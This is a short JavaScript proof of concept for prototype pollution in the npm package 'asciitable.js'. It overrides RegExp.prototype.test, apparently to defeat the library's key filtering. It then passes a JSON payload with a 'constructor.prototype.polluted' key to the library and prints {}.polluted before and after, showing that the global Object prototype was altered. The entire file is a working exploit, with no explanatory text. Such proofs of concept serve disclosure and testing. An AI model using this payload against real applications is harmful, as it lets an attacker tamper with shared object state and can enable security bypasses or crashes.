RegExp.prototype.test = () => false;
console.log({}.polluted);
const req = require('asciitable.js');
const b = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
req({}, b);
console.log({}.polluted);